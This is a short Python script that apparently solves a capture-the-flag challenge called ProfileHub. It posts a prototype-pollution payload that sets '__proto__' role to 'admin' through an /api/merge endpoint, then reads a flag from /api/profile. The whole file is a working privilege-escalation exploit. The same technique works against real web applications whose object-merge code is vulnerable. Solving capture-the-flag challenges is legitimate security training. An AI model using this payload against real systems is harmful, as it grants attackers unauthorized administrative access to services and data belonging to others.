#!/usr/bin/env python3
"""
Get the complete flag from ProfileHub
"""

import requests
import json

TARGET_URL = "http://chall-4f3fb3a6.evt-207.glabs.ctf7.com/"

def get_flag():
    session = requests.Session()
    
    # Step 1: Pollute the prototype with admin role
    print("[*] Exploiting prototype pollution...")
    payload = {
        "base": {},
        "override": {"__proto__": {"role": "admin"}}
    }
    
    resp = session.post(TARGET_URL + 'api/merge', json=payload)
    print(f"[+] Merge response: {resp.status_code}")
    
    # Step 2: Access the profile API to get the flag
    print("[*] Fetching flag from /api/profile...")
    resp = session.get(TARGET_URL + 'api/profile')
    
    if resp.status_code == 200:
        data = resp.json()
        print(f"\n[+] Profile data: {json.dumps(data, indent=2)}")
        
        if 'flag' in data:
            flag = data['flag']
            print(f"\n{'='*60}")
            print(f"FLAG FOUND: {flag}")
            print(f"{'='*60}")
            return flag
    
    return None

if __name__ == "__main__":
    get_flag()
